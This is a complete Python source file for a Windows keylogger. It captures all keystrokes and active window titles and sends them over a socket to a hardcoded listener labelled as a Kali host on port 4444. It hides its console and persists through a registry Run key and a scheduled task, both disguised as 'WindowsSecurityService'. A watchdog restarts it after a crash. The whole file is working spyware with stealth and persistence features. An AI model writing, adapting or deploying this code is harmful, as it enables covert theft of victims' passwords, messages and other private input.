import socket
from pynput import keyboard
import threading
import time
import sys
import os
import winreg
import ctypes
import random
import subprocess
from queue import Queue
from datetime import datetime

KALI_HOST = "192.168.1.171"
KALI_PORT = 4444

# Buffer size for storing keystrokes when connection is down
MAX_BUFFER_SIZE = 10000

# For running as background process
IS_COMPILED = getattr(sys, "frozen", False)

# Log file location
LOG_FILE = os.path.join(os.getenv("APPDATA"), "SystemLogs", "system_log.txt")


def log_to_file(message):
    """Log a message to file and optionally console"""
    try:
        # Create directory if it doesn't exist
        os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)

        # Add timestamp to message
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_message = f"[{timestamp}] {message}\n"

        # Write to log file
        with open(LOG_FILE, "a") as f:
            f.write(log_message)

        # Print to console if not in background mode
        if not IS_COMPILED and "--background" not in sys.argv:
            print(message)
    except Exception:
        # Silently fail if logging isn't possible
        pass


class Sender:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.lock = threading.Lock()
        self.buffer = Queue(maxsize=MAX_BUFFER_SIZE)
        self.connected = False
        self.stop_requested = False
        self.backoff_time = 1  # Initial backoff time in seconds

        # Debug flag - set to False to reduce unnecessary logging
        self.debug_mode = False

        # Start connection manager thread
        self.connection_thread = threading.Thread(
            target=self._connection_manager, daemon=True
        )
        self.connection_thread.start()

        # Start buffer processor thread
        self.buffer_thread = threading.Thread(target=self._process_buffer, daemon=True)
        self.buffer_thread.start()

        # Log initialization
        log_to_file("[*] Sender initialized")

    def _connection_manager(self):
        """Thread that continuously tries to maintain a connection"""
        while not self.stop_requested:
            if not self.connected:
                self._try_connect()

            # Sleep before checking connection again
            # Use a shorter interval if we're connected to detect disconnections quickly
            sleep_time = 1 if self.connected else self.backoff_time
            time.sleep(sleep_time)

    def _try_connect(self):
        """Attempt to establish a connection with backoff strategy"""
        with self.lock:
            try:
                log_to_file(f"[*] Attempting connection to {self.host}:{self.port}")

                # Create a new socket for each connection attempt
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)  # Increased timeout for slower connections
                s.connect((self.host, self.port))
                s.settimeout(None)  # No timeout for regular operations

                # Set TCP_NODELAY to disable Nagle's algorithm (improves transmission speed)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

                # Disable buffering completely
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)

                # Set keep-alive options
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)

                self.sock = s
                self.connected = True
                self.backoff_time = 1  # Reset backoff time on successful connection
                log_to_file(f"[+] Connected to {self.host}:{self.port}")

                # Only send a single quiet connection notification
                connection_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                quiet_msg = f"[Connected: {connection_time}]\n"
                self._raw_send(quiet_msg)

                # Wait a moment to ensure message is sent
                time.sleep(0.1)

                # Then flush any buffered data
                self._flush_buffer_immediate()

            except Exception as e:
                self.connected = False
                self.sock = None
                log_to_file(f"[!] Connection failed: {str(e)}")

                # Implement exponential backoff with jitter for reconnection attempts
                # Cap at 5 minutes maximum retry time
                self.backoff_time = min(self.backoff_time * 1.5, 300)
                jitter = random.uniform(0, 0.5 * self.backoff_time)
                self.backoff_time += jitter
                log_to_file(f"[*] Will retry in {self.backoff_time:.1f} seconds")

    def _raw_send(self, text):
        """Send data directly without buffering (internal use)"""
        if not self.sock or not self.connected:
            return False

        try:
            # Make sure we're ending with newline character for netcat
            if not text.endswith("\n"):
                text += "\n"

            # Encode with explicit newline format for network transmission
            data_to_send = text.encode("utf-8", errors="replace")

            # Send data
            self.sock.send(data_to_send)

            # Add small delay to ensure delivery
            time.sleep(0.01)
            return True
        except Exception as e:
            log_to_file(f"[!] Send failed: {str(e)}")
            self.connected = False
            try:
                self.sock.close()
            except:
                pass
            self.sock = None
            return False

    def _process_buffer(self):
        """Thread that processes the buffer when connection is available"""
        while not self.stop_requested:
            if self.connected and not self.buffer.empty():
                self._flush_buffer()
            time.sleep(0.1)  # Small delay to reduce CPU usage

    def _flush_buffer(self):
        """Process up to 100 items from the buffer"""
        with self.lock:
            if not self.connected:
                return

            # Process batches to prevent blocking for too long
            batch = []
            count = 0
            while not self.buffer.empty() and count < 100:
                batch.append(self.buffer.get())
                count += 1

            if batch:
                try:
                    batch_data = "".join(batch)
                    success = self._raw_send(batch_data)
                    if not success:
                        # Put the data back at the front of the queue
                        for item in reversed(batch):
                            if self.buffer.qsize() < MAX_BUFFER_SIZE:
                                self.buffer.put(item)
                except Exception as e:
                    log_to_file(f"[!] Error processing buffer: {str(e)}")

    def _flush_buffer_immediate(self):
        """Flush the entire buffer immediately when connection is established"""
        with self.lock:
            if not self.connected:
                return

            buffer_content = []
            while not self.buffer.empty():
                buffer_content.append(self.buffer.get())

            if buffer_content:
                buffered_data = "".join(buffer_content)
                success = self._raw_send(
                    f"\n[BUFFERED DATA START]\n{buffered_data}\n[BUFFERED DATA END]\n"
                )
                if not success:
                    # Put the data back at the front of the queue
                    for item in reversed(buffer_content):
                        if self.buffer.qsize() < MAX_BUFFER_SIZE:
                            self.buffer.put(item)

    def send(self, text):
        """Buffer text to be sent when connection is available"""
        # Add to buffer - it will be processed by the buffer thread
        if self.buffer.qsize() < MAX_BUFFER_SIZE:
            self.buffer.put(text)

        # Try immediate send if connected
        if self.connected:
            with self.lock:
                self._flush_buffer()

    def close(self):
        """Stop all threads and close the connection"""
        self.stop_requested = True

        # Wait for threads to terminate
        if hasattr(self, "connection_thread"):
            self.connection_thread.join(1)  # Wait up to 1 second
        if hasattr(self, "buffer_thread"):
            self.buffer_thread.join(1)  # Wait up to 1 second

        # Close socket
        with self.lock:
            if self.sock:
                try:
                    self.sock.close()
                except:
                    pass
                self.sock = None


sender = Sender(KALI_HOST, KALI_PORT)


def format_key(key):
    # Handle normal characters (most common case)
    if hasattr(key, "char") and key.char is not None:
        return key.char

    # Special keys mapping - simplified for better netcat display
    specials = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "\t",
        "Key.backspace": "<BS>",
        "Key.shift": "<SHIFT>",
        "Key.shift_r": "<SHIFT>",
        "Key.shift_l": "<SHIFT>",
        "Key.ctrl_l": "<CTRL>",
        "Key.ctrl_r": "<CTRL>",
        "Key.alt_l": "<ALT>",
        "Key.alt_r": "<ALT>",
        "Key.esc": "<ESC>",
        "Key.caps_lock": "<CAPS>",
        "Key.f1": "<F1>",
        "Key.f2": "<F2>",
        "Key.f3": "<F3>",
        "Key.f4": "<F4>",
        "Key.f5": "<F5>",
        "Key.f6": "<F6>",
        "Key.f7": "<F7>",
        "Key.f8": "<F8>",
        "Key.f9": "<F9>",
        "Key.f10": "<F10>",
        "Key.f11": "<F11>",
        "Key.f12": "<F12>",
        "Key.print_screen": "<PRTSCRN>",
        "Key.scroll_lock": "<SCRLK>",
        "Key.pause": "<PAUSE>",
        "Key.insert": "<INS>",
        "Key.home": "<HOME>",
        "Key.page_up": "<PGUP>",
        "Key.delete": "<DEL>",
        "Key.end": "<END>",
        "Key.page_down": "<PGDN>",
        "Key.right": "<RIGHT>",
        "Key.left": "<LEFT>",
        "Key.down": "<DOWN>",
        "Key.up": "<UP>",
        "Key.menu": "<MENU>",
    }

    key_str = str(key)

    # Try to get from the mapping
    result = specials.get(key_str, f"<{key_str}>")

    return result


# Track active window title
last_window_title = ""


def get_active_window_title():
    """Get the title of the active window"""
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except:
        return ""


def on_press(key):
    try:
        global last_window_title
        global sender

        # Get current window title
        current_window = get_active_window_title()

        # If window changed, log it
        if current_window != last_window_title:
            window_change = f"\n\n[WINDOW: {current_window}]\n"
            # Send directly to socket
            if sender.connected and sender.sock:
                try:
                    sender.sock.send(window_change.encode("utf-8"))
                except:
                    pass
            last_window_title = current_window

        # Format the key
        k = format_key(key)

        # Directly transmit over socket without any buffering
        if k and sender.connected and sender.sock:
            try:
                # Send the key directly to socket - most reliable way
                if len(k) == 1:
                    # For single characters, send as-is
                    sender.sock.send(k.encode("utf-8"))
                else:
                    # For special keys, format more clearly
                    sender.sock.send(f"{k}".encode("utf-8"))

                # Force flush with a small delay for reliable transmission
                sender.sock.send(b"")

            except Exception as e:
                log_to_file(f"[ERROR] Failed to send key directly: {e}")
                # If direct send fails, try reconnecting
                sender.connected = False
                sender._try_connect()
        else:
            # If we can't send directly, add to buffer
            if k:
                sender.send(k)
    except Exception as e:
        log_to_file(f"[!] on_press error: {str(e)}")
        # Continue running even after errors


def add_to_startup(file_path=""):
    """Add the program to Windows startup"""
    if not file_path:
        file_path = os.path.abspath(sys.argv[0])

    # If it's a .py file, we need to run it with pythonw.exe
    if file_path.endswith(".py"):
        file_path = f'pythonw.exe "{file_path}"'

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "WindowsSecurityService", 0, winreg.REG_SZ, file_path)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        if not IS_COMPILED:  # Only print when debugging
            print(f"[!] Failed to add to startup: {e}")
        return False


def hide_console_window():
    """Hide the console window"""
    if IS_COMPILED:
        return  # Already hidden if compiled with PyInstaller

    try:
        # This will hide the console window
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception as e:
        print(f"[!] Failed to hide console: {e}")


def ensure_autostart():
    """Make sure the program starts with Windows"""
    # Add to startup registry
    success1 = add_to_startup()

    # Also create a scheduled task for extra reliability
    try:
        task_name = "WindowsSecurityService"
        script_path = os.path.abspath(sys.argv[0])

        if script_path.endswith(".py"):
            # If it's a Python script, use pythonw.exe
            cmd = f'schtasks /create /tn "{task_name}" /tr "pythonw.exe \\"{script_path}\\" --background" /sc onlogon /rl highest /f'
        else:
            # If it's an executable (compiled with PyInstaller)
            cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{script_path}\\"" /sc onlogon /rl highest /f'

        # Use CREATE_NO_WINDOW flag to hide the console window
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = 0  # SW_HIDE

        subprocess.call(
            cmd,
            shell=True,
            startupinfo=startupinfo,
            stderr=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
        )
        return True
    except Exception:
        return success1  # Fall back to registry method result


def watchdog_thread():
    """Thread that ensures the keylogger keeps running"""
    while True:
        # Check if the main thread is still running
        if not any(
            t.name == "MainThread" and t.is_alive() for t in threading.enumerate()
        ):
            # Main thread died, restart the process
            try:
                python = sys.executable
                os.execl(python, python, *sys.argv)
            except:
                # If we can't restart, at least log it
                log_to_file("[!] Failed to restart after crash")

        # Check every 60 seconds
        time.sleep(60)


def send_heartbeat():
    """Send a minimal heartbeat message to keep connection alive"""
    global sender
    try:
        # Get some system information
        username = os.getenv("USERNAME", "unknown")
        computer_name = os.getenv("COMPUTERNAME", "unknown")
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Now send a compact heartbeat (no test messages)
        heartbeat = f"[HB: {current_time}]\n"

        # Send the heartbeat directly using raw send
        sender._raw_send(heartbeat)

        # Force re-connection if needed
        if not sender.connected:
            log_to_file("[!] Connection lost during heartbeat, reconnecting...")
            sender._try_connect()

    except Exception as e:
        log_to_file(f"[!] Failed to send heartbeat: {str(e)}")
        # Try to reconnect
        sender._try_connect()


def main(background=False):
    global sender

    # Hide console window if running in background
    if background:
        hide_console_window()

    log_to_file("[*] Keylogger initializing...")

    # Create the sender before starting the keyboard listener
    sender = Sender(KALI_HOST, KALI_PORT)

    # Start watchdog thread
    watchdog = threading.Thread(target=watchdog_thread, daemon=True)
    watchdog.start()

    # Start keyboard listener with proper configuration
    try:
        # Create a robust listener with more options
        listener = keyboard.Listener(
            on_press=on_press,
            suppress=False,  # Don't suppress events (let them pass to other apps)
        )
        listener.start()
        log_to_file("[+] Keyboard listener started successfully")
    except Exception as e:
        log_to_file(f"[!] Failed to start keyboard listener: {e}")
        # Try again with simpler configuration
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        log_to_file("[*] Keyboard listener started with fallback configuration")

    if not background:
        print("[*] Keylogger started. Press Ctrl+C in this console to stop.")

    try:
        # Add to startup if in background mode
        if background:
            ensure_autostart()
            log_to_file("[*] Added to system startup")

        # Send initial heartbeat
        send_heartbeat()
        heartbeat_counter = 0

        # Keep the process running
        while True:
            time.sleep(2)  # Check more frequently (every 2 seconds)

            # If the listener died for some reason, restart it
            if not listener.is_alive():
                log_to_file("[!] Keyboard listener died, restarting...")
                listener = keyboard.Listener(on_press=on_press)
                listener.start()

            # Check if connection is active
            if not sender.connected:
                log_to_file("[!] Connection lost, attempting to reconnect...")
                # Force reconnection attempt
                sender._try_connect()

            # Keep track of time for heartbeat
            heartbeat_counter += 1

            # Check socket health more aggressively
            if sender.connected and sender.sock:
                try:
                    # Send a tiny ping (invisible character) to keep the connection alive
                    # This is especially important for detecting connection issues quickly
                    sender.sock.send(b"\x00")
                except:
                    # Connection is likely broken
                    log_to_file("[!] Connection check failed, resetting...")
                    sender.connected = False
                    try:
                        sender.sock.close()
                    except:
                        pass
                    sender.sock = None

            # Heartbeat every 60 seconds (30 iterations × 2 seconds)
            if heartbeat_counter >= 30:
                send_heartbeat()
                heartbeat_counter = 0

    except KeyboardInterrupt:
        if not background:
            print("[*] Stopping...")
    except Exception as e:
        log_to_file(f"[!] Unexpected error in main loop: {str(e)}")
        # Try to restart if in background mode
        if background:
            python = sys.executable
            os.execl(python, python, *sys.argv)
    finally:
        listener.stop()
        sender.close()
        log_to_file("[*] Keylogger stopped")


if __name__ == "__main__":
    # Check if "--background" flag is provided
    if "--background" in sys.argv:
        main(background=True)
    else:
        main(background=False)
